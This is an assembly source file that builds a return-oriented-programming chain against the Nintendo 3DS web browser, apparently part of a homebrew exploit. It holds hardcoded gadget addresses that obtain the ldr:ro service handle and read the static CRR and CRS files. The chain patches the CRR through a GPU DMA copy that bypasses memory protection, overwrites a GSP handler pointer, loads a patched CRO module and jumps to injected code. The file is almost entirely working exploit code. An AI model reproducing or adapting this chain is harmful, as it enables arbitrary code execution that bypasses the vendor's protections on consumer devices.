.nds

.loadtable "../unicode.tbl"
.include "../../build/constants.s"

.create "spider_thread0_rop.bin",0x0

DECOMPLZ11 equ 0x0026AE4C
DEBUGADR equ 0x00151900

thread0rop:
	.word 0xDEADC0DE
	;actual ROP start

	; .word 0x002954e8 ; pop {r0, pc}
	; 	.word 0xFFFFFFFF
	; .word 0x0023d10c ; pop {r1, pc}
	; 	.word 0x00FFFFFF
	; .word 0x002D6A5C ; svcSleepThread

	; .word 0x00279a28 ; pop {lr, pc}
	; ropLoop:
	; 	.word SPIDER_THREAD0ROP_VADR+ropLoop ; lr => sp
	; .word 0x00279a24 ; mov sp, lr | pop {lr, pc}

	; .word 0xDEADDEAD

	;grab ldr:ro handle
		.word 0x002954e8 ; pop {r0, pc}
			.word SPIDER_ROHANDLE_ADR ; r0 (dst)
		.word 0x0023d10c ; pop {r1, pc}
			.word 0x0028572C ; r1 ("ldr:ro")
		.word 0x001db7f4 ; pop	{r2, r3, r4, pc}
			.word 0x00000006 ; r2 (strlen)
			.word 0x00000000 ; r3 (flags)
			.word 0xDEADC0DE ; r4 (garbage)
		.word 0x00267728 ; srv_getServiceHandle(Handle* dst, char* port, u32 strlen, u32 flags) (ends in LDMFD   SP!, {R4-R8,PC})
			.word 0xDEADC0DE ; r4 (garbage)
			.word 0xDEADC0DE ; r5 (garbage)
			.word 0xDEADC0DE ; r6 (garbage)
			.word 0xDEADC0DE ; r7 (garbage)
			.word 0xDEADC0DE ; r8 (garbage)

	;open and read static.crr
		.word 0x001e2454 ; pop {r0, r1, r2, r3, r4, pc}
			.word SPIDER_THREAD0ROP_VADR+fileObj ; r0 (this)
			.word SPIDER_THREAD0ROP_VADR+staticCrr_str ; r1 (path)
			.word 0x00000001 ; r2 (openflags) (read)
			.word 0xDEADC0DE ; r3 (garbage)
			.word 0xDEADC0DE ; r4 (garbage)
		.word 0x0031FE78 ; IFile_Open(_this, path, openflags) (ends in LDMFD   SP!, {R4-R8,PC})
			.word 0xDEADC0DE ; r4 (garbage)
			.word 0xDEADC0DE ; r5 (garbage)
			.word 0xDEADC0DE ; r6 (garbage)
			.word 0xDEADC0DE ; r7 (garbage)
			.word 0xDEADC0DE ; r8 (garbage)

		.word 0x001e2454 ; pop {r0, r1, r2, r3, r4, pc}
			.word SPIDER_THREAD0ROP_VADR+fileObj ; r0 (this)
			.word SPIDER_THREAD0ROP_VADR+tmpVar ; r1 (readbytes)
			.word SPIDER_CRRLOCATION ; r2 (dst)
			.word SPIDER_CRRSIZE ; r3 (size)
			.word 0xDEADC0DE ; r4 (garbage)
		.word 0x0030A098 ; IFile_Read(_this, &readbytes, dst, size) (ends in LDMFD   SP!, {R4-R9,PC})
			.word 0xDEADC0DE ; r4 (garbage)
			.word 0xDEADC0DE ; r5 (garbage)
			.word 0xDEADC0DE ; r6 (garbage)
			.word 0xDEADC0DE ; r7 (garbage)
			.word 0xDEADC0DE ; r8 (garbage)
			.word 0xDEADC0DE ; r9 (garbage)

		;copy piece that'll have to be patched
			.word 0x001e2454 ; pop {r0, r1, r2, r3, r4, pc}
				.word SPIDER_GSPHEAPBUF ; r0 (dst)
				.word SPIDER_CRRLOCATION ; r1 (src)
				.word 0x1000  ; r2 (size)
				.word 0xDEADC0DE ; r3 (garbage)
				.word 0xDEADC0DE ; r4 (garbage)
			.word 0x00255B40 ; memcpy (ends in LDMFD   SP!, {R4-R10,LR})
				.word 0xDEADC0DE ; r4 (garbage)
				.word 0xDEADC0DE ; r5 (garbage)
				.word 0xDEADC0DE ; r6 (garbage)
				.word 0xDEADC0DE ; r7 (garbage)
				.word 0xDEADC0DE ; r8 (garbage)
				.word 0xDEADC0DE ; r9 (garbage)
				.word 0xDEADC0DE ; r10 (garbage)

	;open and read static.crs
		.word 0x001e2454 ; pop {r0, r1, r2, r3, r4, pc}
			.word SPIDER_THREAD0ROP_VADR+fileObj+0x100 ; r0 (this)
			.word SPIDER_THREAD0ROP_VADR+staticCrs_str ; r1 (path)
			.word 0x00000001 ; r2 (openflags) (read)
			.word 0xDEADC0DE ; r3 (garbage)
			.word 0xDEADC0DE ; r4 (garbage)
		.word 0x0031FE78 ; IFile_Open(_this, path, openflags) (ends in LDMFD   SP!, {R4-R8,PC})
			.word 0xDEADC0DE ; r4 (garbage)
			.word 0xDEADC0DE ; r5 (garbage)
			.word 0xDEADC0DE ; r6 (garbage)
			.word 0xDEADC0DE ; r7 (garbage)
			.word 0xDEADC0DE ; r8 (garbage)

		.word 0x001e2454 ; pop {r0, r1, r2, r3, r4, pc}
			.word SPIDER_THREAD0ROP_VADR+fileObj+0x100 ; r0 (this)
			.word SPIDER_THREAD0ROP_VADR+tmpVar ; r1 (readbytes)
			.word SPIDER_CRSLOCATION ; r2 (dst)
			.word SPIDER_CRSSIZE ; r3 (size)
			.word 0xDEADC0DE ; r4 (garbage)
		.word 0x0030A098 ; IFile_Read(_this, &readbytes, dst, size) (ends in LDMFD   SP!, {R4-R9,PC})
			.word 0xDEADC0DE ; r4 (garbage)
			.word 0xDEADC0DE ; r5 (garbage)
			.word 0xDEADC0DE ; r6 (garbage)
			.word 0xDEADC0DE ; r7 (garbage)
			.word 0xDEADC0DE ; r8 (garbage)
			.word 0xDEADC0DE ; r9 (garbage)

	;init ro stuff
		.word 0x001e2454 ; pop {r0, r1, r2, r3, r4, pc}
			.word 0xFFFF8001 ; r0 (processhandle)
			.word SPIDER_CRSLOCATION ; r1 (crsBuffer)
			.word SPIDER_CRSSIZE ; r2 (crsSize)
			.word SPIDER_CRSLOCATION ; r3 (mapAdr)
			.word 0xDEADC0DE ; r4 (garbage)
		.word 0x00289CE4 ; RO_Initialize(processhandle, crsBuffer, crsSize, mapAdr) (ends in LDMFD   SP!, {R4-R6,PC})
			.word 0xDEADC0DE ; r4 (garbage)
			.word 0xDEADC0DE ; r5 (garbage)
			.word 0xDEADC0DE ; r6 (garbage)

		;LDRRO_LoadCRR(ldrroHandle, CRRBUF, SPIDER_CRRSIZE, 0xFFFF8001);
		.word 0x001e2454 ; pop {r0, r1, r2, r3, r4, pc}
			.word 0xFFFF8001 ; r0 (processhandle)
			.word SPIDER_CRRLOCATION ; r1 (crrBuffer)
			.word SPIDER_CRRSIZE ; r2 (crrSize)
			.word 0xDEADC0DE ; r3 (garbage)
			.word 0xDEADC0DE ; r4 (garbage)
		.word 0x002730E4 ; LDRRO_LoadCRR(processhandle, crsBuffer, crrSize, mapAdr) (ends in LDMFD   SP!, {R4,PC})
			.word 0xDEADC0DE ; r4 (garbage)

	;patch crr
		;copy patch
			.word 0x001e2454 ; pop {r0, r1, r2, r3, r4, pc}
				.word SPIDER_GSPHEAPBUF+0x360 ; r0 (dst)
				.word SPIDER_THREAD0ROP_VADR+crrPatch ; r1 (src)
				.word crrPatch_end-crrPatch  ; r2 (size)
				.word 0xDEADC0DE ; r3 (garbage)
				.word 0xDEADC0DE ; r4 (garbage)
			.word 0x00255B40 ; memcpy (ends in LDMFD   SP!, {R4-R10,LR})
				.word 0xDEADC0DE ; r4 (garbage)
				.word 0xDEADC0DE ; r5 (garbage)
				.word 0xDEADC0DE ; r6 (garbage)
				.word 0xDEADC0DE ; r7 (garbage)
				.word 0xDEADC0DE ; r8 (garbage)
				.word 0xDEADC0DE ; r9 (garbage)
				.word 0xDEADC0DE ; r10 (garbage)

		;flush data cache
			.word 0x001e2454 ; pop {r0, r1, r2, r3, r4, pc}
				.word SPIDER_GSPHANDLE_ADR ; r0 (handle ptr)
				.word 0xFFFF8001 ; r1 (kprocess handle)
				.word SPIDER_GSPHEAPBUF  ; r2 (address)
				.word 0x00001000 ; r3 (size)
				.word 0xDEADC0DE ; r4 (garbage)
			.word 0x002A5DC0 ; GSPGPU_FlushDataCache (ends in LDMFD   SP!, {R4-R6,PC})
				.word 0xDEADC0DE ; r4 (garbage)
				.word 0xDEADC0DE ; r5 (garbage)
				.word 0xDEADC0DE ; r6 (garbage)

		;overwrite gsp event ptr
			.word 0x002954e8 ; pop {r0, pc}
				.word 0x00274028 ; r0 (bx lr)
			.word 0x0026bca4 ; pop {r4, pc}
				.word 0x003D8C60 ; r4 (handler ptr addr)
			.word 0x0026bca0 ; str r0, [r4] | pop {r4, pc}
				.word 0xDEADC0DE ; r4 (garbage)

		;send GX command
			.word 0x002954e8 ; pop {r0, pc}
				.word SPIDER_GSPSHAREDMEM_ADR ; r0 (nn__gxlow__CTR__detail__GetInterruptReceiver)
			.word 0x0023d10c ; pop {r1, pc}
				.word SPIDER_THREAD0ROP_VADR+gxCommand ; r1 (cmd addr)
			.word 0x002A5C68 ; nn__gxlow__CTR__CmdReqQueueTx__TryEnqueue (ends in LDMFD   SP!, {R4-R10,PC})
				.word 0xDEADC0DE ; r4 (garbage)
				.word 0xDEADC0DE ; r5 (garbage)
				.word 0xDEADC0DE ; r6 (garbage)
				.word 0xDEADC0DE ; r7 (garbage)
				.word 0xDEADC0DE ; r8 (garbage)
				.word 0xDEADC0DE ; r9 (garbage)
				.word 0xDEADC0DE ; r10 (garbage)

	;read cro
		.word 0x001e2454 ; pop {r0, r1, r2, r3, r4, pc}
			.word SPIDER_THREAD0ROP_VADR+fileObj+0x200 ; r0 (this)
			.word SPIDER_THREAD0ROP_VADR+ossCro_str ; r1 (path)
			.word 0x00000001 ; r2 (openflags) (read)
			.word 0xDEADC0DE ; r3 (garbage)
			.word 0xDEADC0DE ; r4 (garbage)
		.word 0x0031FE78 ; IFile_Open(_this, path, openflags) (ends in LDMFD   SP!, {R4-R8,PC})
			.word 0xDEADC0DE ; r4 (garbage)
			.word 0xDEADC0DE ; r5 (garbage)
			.word 0xDEADC0DE ; r6 (garbage)
			.word 0xDEADC0DE ; r7 (garbage)
			.word 0xDEADC0DE ; r8 (garbage)

		.word 0x001e2454 ; pop {r0, r1, r2, r3, r4, pc}
			.word SPIDER_THREAD0ROP_VADR+fileObj+0x200 ; r0 (this)
			.word SPIDER_THREAD0ROP_VADR+tmpVar ; r1 (readbytes)
			.word SPIDER_CROLEXLOCATION ; r2 (dst)
			.word SPIDER_CROCMPSIZE ; r3 (size)
			.word 0xDEADC0DE ; r4 (garbage)
		.word 0x0030A098 ; IFile_Read(_this, &readbytes, dst, size) (ends in LDMFD   SP!, {R4-R9,PC})
			.word 0xDEADC0DE ; r4 (garbage)
			.word 0xDEADC0DE ; r5 (garbage)
			.word 0xDEADC0DE ; r6 (garbage)
			.word 0xDEADC0DE ; r7 (garbage)
			.word 0xDEADC0DE ; r8 (garbage)
			.word 0xDEADC0DE ; r9 (garbage)

	;decompress cro
		.word 0x002954e8 ; pop {r0, pc}
			.word SPIDER_CROLEXLOCATION ; r0 (src)
		.word 0x0023d10c ; pop {r1, pc}
			.word SPIDER_CROLOCATION ; r1 (dst)
		.word 0x00279a28 ; pop {lr, pc}
			.word 0x0027a124 ; lr (pop {pc})
		.word 0x0026AE4C ; lz11Decomp (ends in LDMFD   SP!, {R4-R9})
			.word 0xDEADC0DE ; r4 (garbage)
			.word 0xDEADC0DE ; r5 (garbage)
			.word 0xDEADC0DE ; r6 (garbage)
			.word 0xDEADC0DE ; r7 (garbage)
			.word 0xDEADC0DE ; r8 (garbage)
			.word 0xDEADC0DE ; r9 (garbage)

	;patch cro (0x0 patch) (hashes)
		.word 0x001e2454 ; pop {r0, r1, r2, r3, r4, pc}
			.word SPIDER_CROLOCATION+CRO_PATCH0_OFFSET ; r0 (dst)
			.word SPIDER_THREAD0ROP_VADR+croPatch0 ; r1 (src)
			.word croPatch0_end-croPatch0  ; r2 (size)
			.word 0xDEADC0DE ; r3 (garbage)
			.word 0xDEADC0DE ; r4 (garbage)
		.word 0x00255B40 ; memcpy (ends in LDMFD   SP!, {R4-R10,LR})
			.word 0xDEADC0DE ; r4 (garbage)
			.word 0xDEADC0DE ; r5 (garbage)
			.word 0xDEADC0DE ; r6 (garbage)
			.word 0xDEADC0DE ; r7 (garbage)
			.word 0xDEADC0DE ; r8 (garbage)
			.word 0xDEADC0DE ; r9 (garbage)
			.word 0xDEADC0DE ; r10 (garbage)

	;patch cro (0x700 patch) (ro code)
		.word 0x001e2454 ; pop {r0, r1, r2, r3, r4, pc}
			.word SPIDER_CROLOCATION+CRO_PATCH1_OFFSET ; r0 (dst)
			.word SPIDER_THREAD0ROP_VADR+croPatch700 ; r1 (src)
			.word croPatch700_end-croPatch700  ; r2 (size)
			.word 0xDEADC0DE ; r3 (garbage)
			.word 0xDEADC0DE ; r4 (garbage)
		.word 0x00255B40 ; memcpy (ends in LDMFD   SP!, {R4-R10,LR})
			.word 0xDEADC0DE ; r4 (garbage)
			.word 0xDEADC0DE ; r5 (garbage)
			.word 0xDEADC0DE ; r6 (garbage)
			.word 0xDEADC0DE ; r7 (garbage)
			.word 0xDEADC0DE ; r8 (garbage)
			.word 0xDEADC0DE ; r9 (garbage)
			.word 0xDEADC0DE ; r10 (garbage)

	;patch cro (0x2000 patch) (spider code)
		.word 0x001e2454 ; pop {r0, r1, r2, r3, r4, pc}
			.word SPIDER_CROLOCATION+CRO_PATCH2_OFFSET ; r0 (dst)
			.word SPIDER_THREAD0ROP_VADR+croPatch2000 ; r1 (src)
			.word croPatch2000_end-croPatch2000  ; r2 (size)
			.word 0xDEADC0DE ; r3 (garbage)
			.word 0xDEADC0DE ; r4 (garbage)
		.word 0x00255B40 ; memcpy (ends in LDMFD   SP!, {R4-R10,LR})
			.word 0xDEADC0DE ; r4 (garbage)
			.word 0xDEADC0DE ; r5 (garbage)
			.word 0xDEADC0DE ; r6 (garbage)
			.word 0xDEADC0DE ; r7 (garbage)
			.word 0xDEADC0DE ; r8 (garbage)
			.word 0xDEADC0DE ; r9 (garbage)
			.word 0xDEADC0DE ; r10 (garbage)

	;patch cro (0x1D9020 patch) (rohax stuff)
		.word 0x001e2454 ; pop {r0, r1, r2, r3, r4, pc}
			.word SPIDER_CROLOCATION+CRO_PATCH3_OFFSET ; r0 (dst)
			.word SPIDER_THREAD0ROP_VADR+croPatch1D9020 ; r1 (src)
			.word croPatch1D9020_end-croPatch1D9020  ; r2 (size)
			.word 0xDEADC0DE ; r3 (garbage)
			.word 0xDEADC0DE ; r4 (garbage)
		.word 0x00255B40 ; memcpy (ends in LDMFD   SP!, {R4-R10,LR})
			.word 0xDEADC0DE ; r4 (garbage)
			.word 0xDEADC0DE ; r5 (garbage)
			.word 0xDEADC0DE ; r6 (garbage)
			.word 0xDEADC0DE ; r7 (garbage)
			.word 0xDEADC0DE ; r8 (garbage)
			.word 0xDEADC0DE ; r9 (garbage)
			.word 0xDEADC0DE ; r10 (garbage)

	;patch cro (0x1DBA90 patch) (rohax stuff)
		.word 0x001e2454 ; pop {r0, r1, r2, r3, r4, pc}
			.word SPIDER_CROLOCATION+CRO_PATCH4_OFFSET ; r0 (dst)
			.word SPIDER_THREAD0ROP_VADR+croPatch1DBA90 ; r1 (src)
			.word croPatch1DBA90_end-croPatch1DBA90  ; r2 (size)
			.word 0xDEADC0DE ; r3 (garbage)
			.word 0xDEADC0DE ; r4 (garbage)
		.word 0x00255B40 ; memcpy (ends in LDMFD   SP!, {R4-R10,LR})
			.word 0xDEADC0DE ; r4 (garbage)
			.word 0xDEADC0DE ; r5 (garbage)
			.word 0xDEADC0DE ; r6 (garbage)
			.word 0xDEADC0DE ; r7 (garbage)
			.word 0xDEADC0DE ; r8 (garbage)
			.word 0xDEADC0DE ; r9 (garbage)
			.word 0xDEADC0DE ; r10 (garbage)

	;load cro

		.word 0x001e2454 ; pop {r0, r1, r2, r3, r4, pc}
			.word 0xDEADC0DE ; r0 (dst, overwritten right after)
			.word SPIDER_THREAD0ROP_VADR+roCommand ; r1 (src)
			.word endRoCommand-roCommand  ; r2 (size)
			.word 0xDEADC0DE ; r3 (garbage)
			.word 0x80-0x5c ; r4 (offset to get to cmd buffer)
		.word 0x00279a28 ; pop {lr, pc}
			.word 0x00285624 ; lr (pop {pc})
		.word 0x00268aa4 ; mrc	15, 0, r0, cr13, cr0, {3} | add	r0, r0, #0x5c | bx	lr
		.word 0x002994f4 ; add r0, r0, r4 | pop {r4, pc}
			.word 0xDEADC0DE ; r4 (garbage)
		.word 0x00255B40 ; memcpy (ends in LDMFD   SP!, {R4-R10,LR})
			.word 0xDEADC0DE ; r4 (garbage)
			.word 0xDEADC0DE ; r5 (garbage)
			.word 0xDEADC0DE ; r6 (garbage)
			.word 0xDEADC0DE ; r7 (garbage)
			.word 0xDEADC0DE ; r8 (garbage)
			.word 0xDEADC0DE ; r9 (garbage)
			.word 0xDEADC0DE ; r10 (garbage)
		.word 0x002954e8 ; pop {r0, pc}
			.word SPIDER_ROHANDLE_ADR ; r0 (handle ptr)
		.word 0x00368520 ; ldr r0, [r0] | pop {r4, pc}
			.word 0xDEADC0DE ; r4 (garbage)
		.word 0x00279a28 ; pop {lr, pc}
			.word 0x00285624 ; lr (pop {pc})
		.word 0x001EA320 ; send command (ends in bx lr)

		; ;get error
		; 	.word 0x00279a28 ; pop {lr, pc}
		; 		.word 0x00285624 ; lr (pop {pc})
		; 	.word 0x00268aa4 ; mrc	15, 0, r0, cr13, cr0, {3} | add	r0, r0, #0x5c | bx	lr
		; 	.word 0x002994f8 ; pop {r4, pc}
		; 		.word 0x80-0x5c+4 ; r4 (offset to get to cmd buffer)
		; 	.word 0x002994f4 ; add r0, r0, r4 | pop {r4, pc}
		; 		.word 0xDEADC0DE ; r4 (garbage)
		; 	.word 0x00368520 ; ldr r0, [r0] | pop {r4, pc}
		; 		.word 0xDEADC0DE ; r4 (garbage)

		;jump to code
		.word SPIDER_CROMAPADR+CRO_SPIDERCODE_OFFSET
		.word 0xDEADDEAD

; .orga 0x800
	staticCrr_str:
		.string "rom:/.crr/static.crr"
		.byte 0x00
		.byte 0x00
	staticCrs_str:
		.string "rom:/static.crs"
		.byte 0x00
		.byte 0x00
	ossCro_str:
		.string "rom:/oss.cro.lex"
		; .string "sdmc:/new_oss.cro"
		.byte 0x00
		.byte 0x00

	.align 0x4
	tmpVar:
		.word 0x00000000

	.align 0x4
	.align 0x20
	gxCommand:
		.word 0x00000004 ;command header (SetTextureCopy)
		.word SPIDER_GSPHEAPBUF ;source address
		.word SPIDER_GSPHEAP+SPIDER_CRRLOCATIONPA-0x20000000 ;destination address
		.word 0x00001000 ;size
		.word 0xFFFFFFFF ; dim in
		.word 0xFFFFFFFF ; dim out
		.word 0x00000008 ; flags
		.word 0x00000000 ; unused

	.align 0x4
	roCommand:
		.word 0x000402c2
		.word SPIDER_CROLOCATION
		.word SPIDER_CROMAPADR
		.word SPIDER_CROSIZE
		.word CRO_RELOCATION_OFFSET
		.word 0x00000000
		.word 0x00007160
		.word CRO_RELOCATION_OFFSET
		.word 0x0000338C
		.word 0x00000001
		.word 0x00000001
		.word 0x00000000
		.word 0x00000000
		.word 0xFFFF8001
		.word 0x00000000
		.word 0x00000000
	endRoCommand:

	.align 0x4
	crrPatch:
		.incbin "../../build/cro/patchCRR.bin"
	crrPatch_end:

	.align 0x4
	croPatch0:
		.incbin "../../build/cro/patch0.bin"
	croPatch0_end:

	.align 0x4
	croPatch700:
		.incbin "../../build/cro/patch1.bin"
	croPatch700_end:

	.align 0x4
	croPatch2000:
		.incbin "../../build/cro/patch2.bin"
	croPatch2000_end:

	.align 0x4
	croPatch1D9020:
		.incbin "../../build/cro/patch3.bin"
	croPatch1D9020_end:

	.align 0x4
	croPatch1DBA90:
		.incbin "../../build/cro/patch4.bin"
	croPatch1DBA90_end:

	.align 0x4
	fileObj:

.Close
